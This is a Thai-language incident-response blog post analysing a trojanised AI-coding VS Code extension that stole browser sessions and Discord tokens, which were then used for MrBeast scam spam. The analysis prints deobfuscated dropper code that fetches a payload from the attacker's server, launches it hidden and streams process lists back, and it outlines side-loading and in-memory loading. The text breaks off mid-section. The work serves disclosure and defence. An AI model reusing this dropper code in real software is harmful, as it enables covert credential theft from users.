---
title: "[RE/DFIR] “โดนได้ไงวะ” Discord กับ IG โดนยึดไปสแปม MrBeast เลยแกะ Malware ย้อนกลับจนเห็นไส้"
desc: "ไม่ได้โหลดโปรแกรมเถื่อน ไม่ได้วางคำสั่งจาก CAPTCHA ปลอม แต่โดนจาก VS Code Extension ของ AI ช่วยเขียนโค้ดปลอม ติดตั้งวันที่ 11 แต่บัญชีเพิ่งโดนเอาไปใช้วันที่ 19 มาเล่าไทม์ไลน์ โดนขโมยอะไรไปบ้าง และแกะโครงสร้าง 3 ชั้นของมันแบบละเอียด"
date: "10-21-2026"
lang: "th"
cover: "/mrbeast/operation-thumbnail.jpg"
alt_lang: "en"
alt_slug: "mrbeastttt"
tags:
  - ReverseEngineering
  - DFIR
  - MalwareAnalysis
  - Infostealer
  - CyberSecurity
---

> This article is also supported by another language: [English](/post/mrbeastttt)

# Introduction

สวัสดีค่ะ กลับเข้าสู่ blog ด้านความปลอดภัยอีกครั้งนึงค่ะ กับแคปชั่นที่ว่า "โดนได้ไงวะ"

เพื่อนๆหลายๆคนอาจจะเห็นบัญชีดิสคอร์ดหลักเราแล้วก็ instagram โดนสแปม Mr Beast แล้วหลายๆคนที่รู้จักเราเป็นพิเศษจะรู้ว่าเป็นไปยากมากที่จะโดนแล้วโดนได้ไง??? บางคนคิดว่าเป็นโหลดโปรแกรมอะไรมาหรือเปล่าบางคนคิดว่าไปโหลดสคริปอะไรมาหรือเปล่าแต่ว่าเรื่องมันลึกกว่านั้นค่ะ วันนี้เราก็เลยนั่งแกะฮาร์ดดิสก์ windows ที่เป็นตัวการและแกะจนหา payload ของ malware และ วิศวกรรมย้อนกลับทั้งหมดจนเห็นไส้หมดเลยค่ะ เดี๋ยววันนี้จะมาเล่าไทม์ไลน์แล้วก็หลักการการทำงาน(ของตัวที่โดนมา) ไปทำอะไรถึงโดนแล้วมีอะไรเป็นไปได้บ้างสำหรับคนทั่วไปเราก็โดนปล้นอะไรไปมั่ง หลักการทำงานเป็นอย่างไรและอื่นๆเดี๋ยวจะมาเล่าให้ฟัง ค่ะ

บทความนี้แบ่งเป็นสองส่วนนะคะ ครึ่งแรก (ไทม์ไลน์ โดนขโมยอะไรไป และควรทำยังไง) เขียนให้ทุกคนอ่านเข้าใจได้ ไม่ต้องรู้เรื่องคอมเยอะ ส่วนครึ่งหลังเป็นการแกะ Malware ทั้ง 3 ชั้น (`geaix-1.0.24.vsix` -> `jli.dll` -> `build.dll`) แบบละเอียดสำหรับสายเทคค่ะ

## สรุปสั้นๆ

- **โดนจากอะไร:** VS Code Extension ของเครื่องมือ AI ช่วยเขียนโค้ดชื่อ "Geaix" ที่เว็บเขาให้โหลดเป็นไฟล์มาติดตั้งเอง ตัวมันใช้งานเป็น AI ได้จริง แต่แอบโหลดโปรแกรมขโมยรหัสผ่านกับ Session มารันเงียบๆ ด้วย
- **ไม่ได้มีแค่ Geaix:** เซิร์ฟเวอร์เดียวกันยังมีเว็บ "AI ช่วยเขียนโค้ด" อีกอย่างน้อย 7 เว็บ (Ahiak, Aiqana, Axqua, Excelnt, Lebang, Plikai, Vunex) ที่เป็นเว็บเดียวกันเป๊ะแค่เปลี่ยนชื่อ ถ้ามีใครส่งเว็บพวกนี้มาให้ อย่าติดตั้งอะไรจากมันนะคะ
- **โดนเมื่อไหร่:** ติดตั้งวันที่ **11 ตุลาคม** แต่สแปมเพิ่งออกวันที่ **19 ตุลาคม** ข้อมูลโดนส่งออกไปตั้งแต่ 8 วันก่อนแล้ว นี่คือเหตุผลที่คนโดนแบบนี้ชอบพูดว่า *"วันนี้ไม่ได้โหลดอะไรเลยนะ"*
- **โดนอะไรไป:** รหัสผ่านที่เซฟไว้ในเบราว์เซอร์, คุกกี้ที่ทำให้เราล็อกอินค้างไว้ในเว็บต่างๆ, Token ของ Discord, Session ของ Steam กับ Roblox, ข้อมูล Autofill (เบอร์โทร ที่อยู่ เลขบัตรประชาชน), ประวัติการเข้าเว็บ, ภาพหน้าจอ และข้อมูลสเปคเครื่องกับรายชื่อโปรแกรมที่ลงไว้ พอมีคุกกี้กับ Token แล้ว คนร้ายไม่ต้องรู้รหัสผ่านหรือผ่าน 2FA เลย เพราะมันล็อกอินเป็นเราอยู่แล้ว
- **เราทำอะไรไปแล้ว:** เตะ Session แปลกปลอมออก เปลี่ยนรหัสผ่าน กด Log out ทุกอุปกรณ์ในทุกบริการ และล้าง Windows ตัวที่ติดทิ้ง
- **ถ้าเป็นเราควรทำยังไง:** ดูหัวข้อ **ควรทำยังไง** ท้ายบทความได้เลยค่ะ เป็น Checklist สั้นๆ ไม่ต้องเป็นสายเทคก็ทำตามได้

> **ขอบอกไว้ก่อน:** นี่เป็นแค่ *หนึ่ง* ในหลายวิธีที่สแปม MrBeast แพร่ออกไปนะคะ ไม่ใช่ว่าสแปม MrBeast หรือ Session Stealer ทุกตัวจะทำงานแบบนี้ ตัวขโมยข้อมูลมีเยอะมาก มาได้จากไฟล์และแอปทุกรูปแบบ ในเครื่องทุกแบบ แต่ตอนจบเหมือนกันหมดคือ Session โดนขโมยแล้วบอทเอาไปสแปมเพื่อน ตัวนี้คือตัวที่เราโดนมา แล้วพอแกะดูแล้วมันน่าสนใจมาก เลยเอามาเล่าให้ฟังค่ะ

![โน้ตบุ๊กที่เปิดรายงาน Forensic อยู่ ข้างหลังคือเครื่อง Windows ที่ติดไวรัส](/mrbeast/operation-thumbnail.avif)

---

## ลำดับเหตุการณ์และไทม์ไลน์ (11 ตุลาคม – 19 ตุลาคม 2026)

เรื่องมันเริ่มวันที่ **19 ตุลาคม 2026 ประมาณ 16:57 น.** อยู่ดีๆ บัญชีหลักของเราก็ส่งสแปมออกไปหาคนอื่นพร้อมกันหมดเลยค่ะ:

1. **บัญชี Discord หลัก (`mindhas403` / `MindyGoesBye :3`):** ส่งรูปภาพปลอม 4 รูปโปรโมตเว็บพนันคริปโตที่แอบอ้างชื่อ MrBeast แจกเงิน `$3,500` / `$3,700` (`basoowin.com` โค้ด `TAKE`) เข้าไปใน DM ของเพื่อนๆ

![บัญชี Discord ของเราส่งสแปม MrBeast เข้าแชทส่วนตัวของเพื่อน](/mrbeast/discord-dm-scam.avif)

2. **บัญชี Instagram (`MindTheNerd :3` / `mindhas403`):** ส่งลิงก์ `famopex.com` เข้าไปในแชทของเพื่อน และเอาภาพโปรโมต MrBeast แจกโบนัส `$2,500` (`Famopex.com` โค้ด `GIFT`) ไปโพสต์ลง Story ของบัญชี

![บัญชี Instagram ของเราส่งลิงก์ famopex.com เข้าแชทเพื่อน](/mrbeast/ig-dm-scam.avif)

![บัญชี Instagram ของเราโพสต์ Story สแกม MrBeast](/mrbeast/ig-story-scam.avif)

![มีม: "Withdrawal Failed! Mr. Beast Exit Scam" กับหน้าโอน 2700 USDT ที่ขึ้นว่า Failed](/mrbeast/exit-scam-meme.avif)
> ส่วนนี่คือตอนจบของคนที่หลงไปสมัครแล้วกดถอน "โบนัส" ค่ะ 555

3. พอเราเปิดหน้า **Devices** ในตั้งค่า Discord ตอนเวลา **16:59 น.** (หลังเกิดเหตุ 2 นาที) ก็พบว่ามี Session แปลกปลอมล็อกอินเข้ามาในบัญชีจาก 2 ประเทศ:
   - `Windows · Chrome` — **Los Angeles, California, United States** (*ไม่ถึงชั่วโมงที่ผ่านมา*)
   - `Windows · Discord Client` — **Cologne, North Rhine-Westphalia, Germany** (*ไม่ถึงชั่วโมงที่ผ่านมา*)

![Session แปลกปลอมจากอเมริกาและเยอรมนีในบัญชี Discord ของเรา](/mrbeast/discord-devices.avif)

### พฤติกรรมของบอทสแปม MrBeast: ส่งเรียง A–Z แล้วจับยัด Ignore เพื่อปิดแจ้งเตือน

ระหว่างที่นั่งเตะ Session ออกแล้วไล่เช็คความเสียหาย เราก็เห็นว่าบอทตัวนี้มันแอบซ่อนตัวจากเจ้าของบัญชีแบบเนียนมากค่ะ:

![รายชื่อเพื่อน 36 คนที่ถูกบอทจับยัดเข้า Ignored accounts เรียงตามตัวอักษร](/mrbeast/discord-ignored-list.avif)

1. ตัวบอทจะดึงรายชื่อเพื่อน (Friend List) ทั้งหมดมา**เรียงตามตัวอักษร A ถึง Z** แล้วไล่ส่งข้อความสแปม MrBeast ทีละคน
2. ทันทีที่ส่งหาเพื่อนคนไหนเสร็จ **บอทจะกดเพิ่มเพื่อนคนนั้นเข้า `Ignored accounts` (เพิกเฉยบัญชี) ทันที** (ในรูปคือโดนบอทกด Ignore ไป 36 คนก่อนที่เราจะเตะมันออกทัน) สาเหตุที่มันทำแบบนี้เพราะเมื่อเรา Ignore ใครใน Discord แชทของคนนั้นจะถูกซ่อนและไม่เด้งแจ้งเตือนขึ้นมาเลย เวลาเพื่อนทักกลับมาถามว่า *"โดนแฮกหรือเปล่า?"* เราจะไม่เห็นแจ้งเตือนอะไรทั้งสิ้น
3. พอบอทไล่ส่ง DM หาเพื่อนจนครบทั้งรายชื่อแล้ว ขั้นตอนต่อไปคือมันจะเริ่ม**ส่งสแปมลงทุกเซิร์ฟเวอร์ (Server) ที่เราเข้าร่วมอยู่**ค่ะ

โชคดีที่เราเห็นและเตะ Session ออกพร้อมเปลี่ยนรหัสผ่านได้ภายใน 2 นาที (16:57 น. ถึง 16:59 น.) ทำให้บอทถูกตัดจบตั้งแต่ยังไล่ส่งเพื่อนไม่ครบ ยังไม่ทันได้สแปมลงเซิร์ฟเวอร์ไหน และเอาบัญชีกลับมาได้ก่อนที่ Discord จะแบนถาวร รอดไปค่ะ 555

---

## ทำไมคนโดนถึงชอบบอกว่า "ไม่ได้โหลดอะไรเลย": ช่องว่าง 8 วัน

ใครทันยุคสแปม "แจก Discord Nitro ฟรี" สมัยก่อนน่าจะจำได้ ซึ่งสมัยนั้นมันมีสองสายคู่ขนานกันอยู่ค่ะ **สายแรก** คือลิงก์แจก Nitro ฟรีที่กดเข้าไปแล้วเด้งไปหน้าล็อกอิน Steam ปลอม พอกรอกรหัสไปปุ๊บบัญชี Steam ก็หลุด (คนร้ายเอาไปเทรดไอเทม ขายบัญชี ฯลฯ) **สายที่สอง** ไม่เกี่ยวกับ Steam เลย คือเราไปโหลดโปรแกรมเถื่อนจาก Google หรือ Pirate Bay มารัน หรือรันสคริปต์แปลกๆ ที่เพื่อนในดิสส่งมา แล้ว Session ของเครื่องเราก็โดนขโมย พอขโมยได้ปุ๊บบอทก็จับบัญชี Discord เราไปสแปม "แจก Nitro ฟรี" ต่อให้เพื่อนในลิสต์อีกที (ซึ่งเพื่อนก็อาจจะไปเจอสายแรกได้ วนลูปกันแบบนั้น) สายที่สองนี่กว่าบัญชีเราจะเริ่มสแปมก็ 1–3 วันถัดมา แล้วตัวมันก็ซ่อนร่องรอยไว้ใน `%TEMP%` คล้ายๆ กับที่เราเพิ่งแกะออกมานี่แหละค่ะ ไอเดียมันยังเหมือนเดิมอยู่ แค่สมัยนี้คนร้ายไม่ต้องรอให้เราไปโหลดของเถื่อนหรือรันสคริปต์มั่วๆ อีกต่อไป เพราะมันปลอมเป็น "เครื่องมือจริง" ที่เพื่อนเราแนะนำมาเลย

แต่พอมานั่งไล่ไทม์ไลน์จากฮาร์ดดิสก์เครื่อง Windows 11 (`YuriPC-Win11`) ของเรา พบว่าเครื่องไม่ได้เพิ่งติดไวรัสในวันที่ 19 ตุลาคมนะคะ แต่ติดมาตั้งแต่วันที่ **11 ตุลาคม 2026 เวลา 23:57:52 น.** หรือ 8 วันก่อนที่สแปมจะออกค่ะ เรากดติดตั้ง Extension หลังจากนั้นหนึ่งนาที แล้วอีก 36 วินาทีต่อมาไฟล์ของตัวขโมยข้อมูลก็มาโผล่ใน `%TEMP%` แล้ว:

```text
CreationTime           LastWriteTime          Length   FullName
------------           -------------          ------   --------
10/11/2026 11:57:52 PM 10/11/2026 11:57:56 PM 27124774 D:\Users\MindTheNerd\Downloads\geaix-1.0.24.vsix
10/11/2026 11:58:51 PM 10/11/2026 11:58:51 PM     2836 C:\Users\MindTheNerd\.vscode\extensions\geaix.geaix-1.0.24\.vsixmanifest
10/11/2026 11:59:27 PM 10/11/2026 11:59:27 PM    50344 C:\Users\MindTheNerd\AppData\Local\Temp\wuauclt-b38806a7\javaw.exe
10/11/2026 11:59:27 PM 10/11/2026 11:59:27 PM   736256 C:\Users\MindTheNerd\AppData\Local\Temp\wuauclt-b38806a7\jli.dll
```

### ไปโดนจากอะไรตั้งแต่วันที่ 11 ตุลาคม?
ตอนนั้นเพื่อนคนนึงแนะนำให้ลองโหลด Third-party AI สำหรับช่วยเขียนโค้ด (`geaix.com`) มาใช้ ซึ่งหน้าเว็บ Dashboard ของเขา (`https://geaix.com/dashboard/editor`) บังคับให้ดาวน์โหลดไฟล์ VS Code Extension (`geaix-1.0.24.vsix`) มาติดตั้งแบบ Manual เอง

ตอนแรกก็เอ๊ะนะว่าทำไมไม่เอาขึ้น VS Code Marketplace แต่ก็คิดว่าคงเพิ่งเปิดใหม่ แถมเข้าใจไปเองว่า VS Code น่าจะมี Sandbox กั้นอยู่แล้ว (ไม่มีจ้า) จังหวะนั้นเปิด Windows ปั่นอีกโปรเจคอยู่ (`osu-somtum-patcher`) เลยไม่ได้แกะ `.vsix` มาเช็คก่อน กดติดตั้งไปเลย พลาดเองค่ะ (แล้ววันที่ 19 ตุลาคม 20:10 น. ยังเอาไฟล์เดิมไปลงใน Google Antigravity อีกรอบ พลาดซ้ำสองค่ะ)

ฝั่งคนร้ายทำอะไรระหว่างวันที่ 11 ถึง 19 เรามองไม่เห็นนะคะ แต่ปกติข้อมูลล็อกอินที่โดนขโมยแบบนี้จะถูกเก็บรวมเป็นก้อนแล้วเอาไปขายหรือเอาไปใช้ทีหลัง ช่องว่างเป็นอาทิตย์ถือว่าปกติมาก นี่คือเหตุผลที่คนโดนชอบพูดว่า *"วันนี้ไม่ได้โหลดอะไรเลยนะ"* คือโหลดจริงแหละ แค่ไม่ใช่วันนั้น และที่สำคัญคือ **Malware สมัยนี้ไม่ได้มาแค่กับโปรแกรมเถื่อน (Crack) หรือหน้า CAPTCHA ปลอมให้กดวางคำสั่งใน cmd/PowerShell เท่านั้น แต่มันมากับ Plugin หรือ Extension ที่เราติดตั้งเพิ่มได้ทุกชนิด ไม่ว่าจะเป็น VS Code Extension, Browser Extension, หรือแม้แต่ปลั๊กอินและม็อดในเกมอย่าง Minecraft ค่ะ**

---

## ตัดเน็ตก่อนเริ่มแกะ (Isolated LAN)

ก่อนจะเริ่มค้นอะไรในเครื่อง Windows ที่ติด สิ่งแรกที่ทำคือ **ตัดเน็ตเครื่องนั้นออกก่อน** เพราะอย่างที่จะเห็นใน Stage 1 กับ Stage 3 ข้างล่าง ตัว Malware ส่งรายชื่อ Process ทั้งหมดในเครื่อง (`Win32_Process`) กลับไปหาเซิร์ฟเวอร์คนร้ายทุกๆ 3 วินาทีเป็นเวลา 15 นาทีหลังรันทุกครั้ง (และมันรันใหม่ทุกครั้งที่เปิด Editor) แถมยังรับคำสั่งให้โหลดโปรแกรมอื่นมารันเพิ่มได้ ถ้าปล่อยให้ต่อเน็ตอยู่ระหว่างที่เราไล่แกะ คนร้ายจะเห็นว่าเรากำลังทำอะไร และจะส่งอะไรมาเพิ่มก็ได้ค่ะ

![สาย LAN เส้นเดียวจากอแดปเตอร์ USB-C ของโน้ตบุ๊ก Linux เสียบตรงเข้าเครื่อง Windows ที่ติดไวรัส](/mrbeast/isolated-lan-setup.avif)

วิธีที่ใช้:
1. ถอดเน็ตเครื่อง Windows 11 (`YuriPC-Win11`) ออก
2. เอาโน้ตบุ๊กที่รัน **Fedora Linux** ต่ออแดปเตอร์ USB-C Ethernet (`GOOJODOQ`) แล้วเสียบสาย LAN เส้นเดียวตรงเข้าเครื่อง Windows กลายเป็นวง LAN ส่วนตัวที่มีแค่สองเครื่อง (เครื่อง Windows อยู่ที่ `192.168.1.44`) และไม่มีทางออกอินเทอร์เน็ต
3. ผ่านสายเส้นนี้เส้นเดียว ให้ AI บน Fedora วิ่งเข้าไปค้นไฟล์ในเครื่อง Windows ดึง Registry, DPAPI master key, ฐานข้อมูลเบราว์เซอร์ และไฟล์ Malware ออกมาแกะทั้งแบบ Static และ Dynamic ค่ะ

---

## วิศวกรรมย้อนกลับ (Reverse Engineering): ผ่าโครงสร้าง 3 ชั้นของ `geaix.geaix-1.0.24`

> **ไม่ใช่สายเทค?** ส่วนนี้ลงลึกถึงโค้ดกับ Assembly เลย ข้ามไปอ่านหัวข้อ **สรุปความเสียหาย** กับ **ควรทำยังไง** ข้างล่างได้เลยค่ะ
>
> สรุปแบบภาษาคน Malware ตัวนี้มี 3 ชั้น **(1)** ตัว Extension เป็น AI ช่วยเขียนโค้ดของจริง แต่มีโค้ดแอบซ่อนไว้ท้ายไฟล์ พอเราล็อกอิน มันจะโหลดไฟล์ ZIP มารัน **(2)** ใน ZIP มีโปรแกรม Java ของแท้ที่มีลายเซ็นถูกต้อง วางคู่กับไฟล์ DLL ปลอม Windows จะโหลด DLL ปลอมตัวนี้เพราะมันอยู่โฟลเดอร์เดียวกัน ตัวไวรัสเลยได้ไปรันอยู่ในโปรแกรมที่ดูน่าเชื่อถือ **(3)** DLL ปลอมจะถอดรหัสตัวขโมยข้อมูลจริงออกมาไว้ใน RAM อย่างเดียว ไม่มีไฟล์ปกติให้เห็นบนดิสก์ ตัวนี้จะเก็บรหัสผ่าน คุกกี้ และ Token ส่งออกไป แล้วค้างอยู่ในเครื่องเพื่อคอยสลับเลขกระเป๋าคริปโตที่เรากด Copy

โอเค เข้าโหมดเนิร์ดละค่ะ ตัวนี้มี 3 ชั้น ทุกชั้นมีเป้าหมายเดียวกันคือให้ตัวขโมยข้อมูลจริงอยู่แค่ใน RAM แล้วไปรันอยู่ในโปรแกรมที่มีลายเซ็นถูกต้อง จะได้ดูไม่น่าสงสัย:

- **Stage 1 (`geaix-1.0.24.vsix` -> `extension/dist/extension.js`):** ตัว Extension ขนาด `36,654,196` ไบต์ที่ถูกดัดแปลง (Fork) มาจากโปรเจค Open-Source จริงอย่าง **Kilo Code** โดยคนร้ายแอบแปะโค้ด JavaScript Dropper ที่ถูก Obfuscate (`qEa` -> `Kgt`, `HEa`, `gdn`, `DEa`) เอาไว้ที่ส่วนท้ายสุดของไฟล์
- **Stage 2 (`javaw.exe` + `jli.dll`):** ใช้ไฟล์ `javaw.exe` ของแท้ที่มีลายเซ็นดิจิทัลถูกต้องของ **Eclipse Adoptium Temurin OpenJDK** (`50,344` ไบต์) มาทำ **DLL Side-Loading** โหลดไฟล์ `jli.dll` ปลอม (`736,256` ไบต์ ชื่อในตาราง Export คือ `loader.dll`) ซึ่งถูกทำให้อ่านยากด้วยเทคนิค Control-Flow Flattening (CFF) แล้วจำลองการโหลดไฟล์ PE ของ Stage 3 ลงในหน่วยความจำก้อนเดียวที่เป็น RWX
- **Stage 3 (`build.dll`):** ไฟล์ PE64 DLL (ขนาด `607,744` ไบต์เมื่อประกอบกลับ, `SizeOfImage` `0x9b000`) ที่ถูกเก็บไว้ใน `jli.dll` เป็นข้อความเข้ารหัส แล้วถอดออกมาไว้ใน RAM เท่านั้น (ตัวอักษร 64 ตัวแบบ Custom + LZ77) ทำหน้าที่ตรวจจับ VM, เช็คภาษาเครื่องเพื่อเว้นประเทศกลุ่มรัสเซีย/CIS, เจาะระบบป้องกัน Chrome `v20` App-Bound Encryption ผ่านการสร้าง Hidden Desktop แล้วทำ Thread Hijacking, ขโมยข้อมูลเบราว์เซอร์/Discord/Steam/Roblox, รับคำสั่งรันไฟล์เสริม และดักสลับเลขกระเป๋าคริปโตใน Clipboard ทุกๆ 300ms

![แผนผังการทำงานแบบละเอียดของ Geaix VS Code Extension Malware](/mrbeast/attack-flow.avif)

---

### Stage 1: ชำแหละโค้ด JavaScript Dropper ใน `.vsix` (`extension/dist/extension.js`)

ไฟล์ `.vsix` จริงๆ ก็คือ ZIP ธรรมดา เลยแตกไฟล์ `geaix-1.0.24.vsix` (`27,124,774` ไบต์, SHA-256 `02cd28dc0a9c1ee109462aa6942dfbc3bdb1af9210315eaa326e73e49d01ac0d`) ออกมาดูเลย ใน `extension.vsixmanifest` เขียนว่า Publisher คือ `geaix` เวอร์ชัน `1.0.24`

ส่วนหน้าของไฟล์ `extension/dist/extension.js` (`disasm/geaix_pre_tail_deobfuscated.js` ทั้งหมด 76 ฟังก์ชัน) คือโค้ดของปลั๊กอิน **Kilo Code** ของจริงทั้งหมดที่ถูกเปลี่ยนชื่อคำสั่งเป็น `geaix.*` และในไฟล์ `extension/changelog.md` คนร้ายได้ปลอมบันทึกการอัปเดตไว้ 11 เวอร์ชันตั้งแต่ `1.0.0` ถึง `1.0.24` อันเวอร์ชัน `1.0.5` นี่แอบน่าสงสัยค่ะ:
> `1.0.5 — Maintenance release: infrastructure move to a new host, no user-facing changes.`

#### กลไกการฝังตัว (Persistence) ผ่าน Lifecycle ของ IDE
ไม่มี Registry `Run` key ไม่มีไฟล์ใน Startup ไม่มี Scheduled Task เลยสักอย่าง เพราะมันไม่จำเป็นต้องมี ใน `extension/package.json` มีแค่นี้ก็พอแล้ว:
```json
"activationEvents": [
  "onLanguage",
  "onStartupFinished"
]
```
ทุกครั้งที่ผู้ใช้เปิด VS Code หรือ Google Antigravity ขึ้นมา ตัวโปรแกรมจะเรียก `activate(context)` -> `qEa(context)` ทันที โดยในตอนท้ายของฟังก์ชัน `qEa` จะสั่งรันตัว Dropper `Kgt` และผูก Event Listener ดัก `context.secrets.onDidChange` เอาไว้ด้วย เผื่อกรณีที่ผู้ใช้ยังไม่ได้ล็อกอินตอนเปิดโปรแกรม ทันทีที่ผู้ใช้กดล็อกอินและได้ `geaix.account.token` มา ฟังก์ชัน `Kgt` ก็จะทำงานทันที:

```js
// โค้ดที่แกะ Obfuscation แล้วจาก extension/dist/extension.js (บรรทัด 929–939)
return HXr(), Kgt(context, Bg()).catch(() => {}),
  context.subscriptions.push(
    context.secrets.onDidChange((event) => {
      if (event.key === "geaix.account.token") {
        Kgt(context, Bg()).catch(() => {});
      }
    })
  ),
  new PGe(G0, sidebarProvider, ipcSocketPath, hasIpcSocket);
```

#### ลำดับการทำงานของ `Kgt()`, `PEa()`, `MEa()` และ `DEa()`
ท้ายไฟล์ `extension.js` โดน Obfuscate ด้วย String Array แบบหมุน (`_0x1dc9`) พอเขียนสคริปต์ถอดออกมาหมดแล้ว `Kgt` ทำแบบนี้ค่ะ:

1. **เช็ค OS และ Token:**
   ตรวจสอบว่า `process.platform === "win32"` และดึงค่า `await context.secrets.get("geaix.account.token")` ถ้ายังไม่มี Token จะหยุดการทำงานทันที (`skip: no token yet, waiting for login`)
2. **ดึงข้อมูล Payload จาก API (`/api/vscode/software/pick`):**
   ส่ง HTTP `GET` (กำหนด Timeout `TEa = 20,000 ms`) ไปที่ `https://geaix.com/api/vscode/software/pick?platform=win` พร้อมแนบ Headers:
   ```js
   {
     "x-geaix-client": "vscode",
     "x-geaix-feat": "zip",
     "authorization": "Bearer " + token
   }
   ```
   เซิร์ฟเวอร์จะตอบกลับมาเป็น JSON: `{ pick: { id, sha256, name, fileType: "zip", entry: "javaw.exe" } }`
3. **เช็ค Cache จาก `globalState`:**
   ตรวจสอบค่า `geaix.partnerSoftware.lastSha256` (`Idn`) และ `geaix.partnerSoftware.lastPath` (`qgt`) ใน `context.globalState` ถ้าไฟล์ใน `%TEMP%` ยังอยู่ครบและมีค่า SHA-256 ตรงกับที่เซิร์ฟเวอร์ส่งมา (`cache hit`) มันจะข้ามการดาวน์โหลดและสั่งรัน `javaw.exe` ตัวเดิมทันที
4. **การสุ่มชื่อโฟลเดอร์พรางตัว (`PEa`) และแตกไฟล์ ZIP (`MEa`):**
   ถ้ายังไม่มีไฟล์ในเครื่อง มันจะดาวน์โหลดไฟล์ ZIP จาก `GET /api/vscode/software/download/<id>` (Timeout `VEa = 60,000 ms`) ตรวจสอบค่า SHA-256 ด้วยฟังก์ชัน `vdn()` แล้วสร้างโฟลเดอร์ใน `%TEMP%` โดยสุ่มคำนำหน้าด้วย `crypto.randomBytes(16)[0] % 12` จากอาร์เรย์ `o4e` ทั้ง 12 คำนี้:
   ```js
   const o4e = [
     "SessionId", "allowDots", "installer", "svchost", "wuauclt", "msupdate",
     "text/plain;charset=US-ASCII", "--\r\n", "\n  ", "tmp", "wawarabic", "serverInfo"
   ];
   ```
   ตามด้วยเครื่องหมาย `-` หรือ `_` และเลขฐานสิบหกสุ่มอีก 4–7 ไบต์ ซึ่งในเครื่องของเรามันสร้างโฟลเดอร์ชื่อ:
   `C:\Users\mindthenerd\AppData\Local\Temp\wuauclt-b38806a7\`
   จากนั้นฟังก์ชัน `MEa` จะใช้ไลบรารี `yauzl` แตกไฟล์ออกมา 3 ไฟล์ (โดยมีการเช็คป้องกัน Zip Slip `if (rel.startsWith('..') || path.isAbsolute(rel))` ไว้ด้วย) ได้แก่ `javaw.exe`, `jli.dll` และ `vcruntime140.dll`
5. **การสั่งรัน Process แบบซ่อนหน้าต่าง:**
   ```js
   let child = child_process.spawn(
     "cmd.exe",
     ["/c", "start", "", "/B", entryPath],
     { cwd: extractDir, detached: true, stdio: "ignore", windowsHide: true }
   );
   child.unref();
   ```
6. **ระบบสอดแนม Process และไฟล์ผ่าน WebSocket นาน 15 นาที (`gdn` & `DEa`):**
   หลังสั่งรัน `javaw.exe` แล้ว มันจะยิง `POST /api/vscode/software/started` (`HEa`) เพื่อแจ้ง PID กลับไป และเปิดการเชื่อมต่อ WebSocket ไปที่ `wss://geaix.com/api/ws?client=vscode&token=<token>` เป็นเวลา `YEa = 900,000 ms` (15 นาที) โดยทุกๆ `WEa = 3,000 ms` (3 วินาที) จะเรียกฟังก์ชัน `DEa`:
   ```js
   // โค้ดที่แกะ Obfuscation แล้วจาก DEa() ใน extension/dist/extension.js (บรรทัด 232–249)
   child_process.exec(
     'powershell.exe -NoProfile -Command "Get-CimInstance Win32_Process | Select-Object ProcessId,ParentProcessId,Name,CommandLine | ConvertTo-Json -Compress"',
     { timeout: 4000, windowsHide: true, maxBuffer: 4 * 1024 * 1024 },
     (err, stdout) => { ... }
   );
   ```
   โดยมีฟังก์ชัน `_Ea()` คอยกรอง Process ของตัวมันเอง (`get-ciminstance win32_process`, `wmic process`, `conhost.exe`) ออกก่อน แล้วส่งทั้งโครงสร้าง Process Tree พร้อมรายชื่อไฟล์ที่ถูกสร้างใหม่หรือแก้ไข (`added` / `modified` จากฟังก์ชัน `pdn` และ `ZEa` จำกัด 10 ไฟล์ต่อรอบ) ใน `%TEMP%`, `%APPDATA%`, `%LOCALAPPDATA%`, `%PROGRAMDATA%` และ `C:\Users\Public` กลับไปให้คนร้ายผ่านเฟรม `{"type": "log/batch", "items": [...]}`

---

### Stage 2: เจาะลึก DLL Side-Loading, Control-Flow Flattening และ Reflective Loader (`jli.dll`)

ในโฟลเดอร์ `%TEMP%\wuauclt-b38806a7\` ไฟล์ `javaw.exe` (`50,344` ไบต์, SHA-256 `ca798475...`) คือไฟล์จริงของ **Eclipse Adoptium Temurin OpenJDK** ที่มีลายเซ็นดิจิทัลถูกต้อง (`CN = Eclipse.org Foundation, Inc.`)

เมื่อ `javaw.exe` ทำงาน Windows Loader จะทำการโหลด `jli.dll` จากโฟลเดอร์เดียวกันขึ้นมาโดยอัตโนมัติ ซึ่งไฟล์ `jli.dll` (`736,256` ไบต์, SHA-256 `d76e906a...`) ในโฟลเดอร์นี้คือ Stage 2 Loader ของคนร้ายที่ไม่มีลายเซ็นดิจิทัล

#### หลักฐานทางนิติวิทยาศาสตร์ในโครงสร้าง PE Header
แค่เปิดดู PE Header ของ `jli.dll` กับ `build.dll` ก็เจออะไรแปลกๆ เพียบแล้วค่ะ:

1. **ชื่อภายใน Export Directory คือ `loader.dll`:**
   ใน `IMAGE_EXPORT_DIRECTORY.Name` ของไฟล์ `jli.dll` ระบุชื่อภายในของตัวเองว่า **`loader.dll`** (ไม่ใช่ `jli.dll`) โดยทำฟังก์ชัน Export จำลองไว้ 7 ตัวเพื่อให้ตรงกับที่ `javaw.exe` เรียกหา:
   ```text
   JLI_CmdToArgs         @ 0x180005206
   JLI_GetStdArgc        @ 0x180006099
   JLI_GetStdArgs        @ 0x180004875
   JLI_InitArgProcessing @ 0x180003809
   JLI_Launch            @ 0x18000477b  <-- ฟังก์ชันหลักที่ javaw.exe เรียกใช้งาน
   JLI_MemAlloc          @ 0x180006616
   JLI_MemFree           @ 0x1800051f1
   ```
2. **ความสัมพันธ์ของเวลาคอมไพล์ (ห่างกันเพียง 14 วินาที):**
   | ไฟล์ Binary | ค่า `TimeDateStamp` | เวลา UTC | Rich Header |
   |---|---|---|---|
   | `build.dll` (Stage 3) | `0x6acb8e11` | `2026-10-11 13:24:33 UTC` | ถูกลบออก (Stripped) |
   | `jli.dll` (`loader.dll`) | `0x6acb8e1f` | `2026-10-11 13:24:47 UTC` | ถูกลบออก (Stripped) |

   ตัว Stage 3 (`build.dll`) ถูกคอมไพล์เสร็จตอนเวลา `13:24:33 UTC` จากนั้นถูกนำไปเข้ารหัสฝังลงใน `.rdata` ของ Stage 2 แล้วคอมไพล์ออกมาเป็น `jli.dll` ตอนเวลา `13:24:47 UTC` (ห่างกันแค่ **14 วินาที**) ซึ่งเป็นเวลาเพียงไม่กี่ชั่วโมงก่อนที่เราจะกดดาวน์โหลดมาลงเครื่องในคืนวันที่ 11 ตุลาคม และไฟล์มัลแวร์ทั้งสองตัวถูกลบ MSVC Rich Header ออกทั้งหมด ในขณะที่ `javaw.exe` และ `vcruntime140.dll` ของแท้ยังมี Rich Header ของ MSVC 2022 อยู่ครบ
3. **ตาราง Import ที่ดูสะอาดตา:**
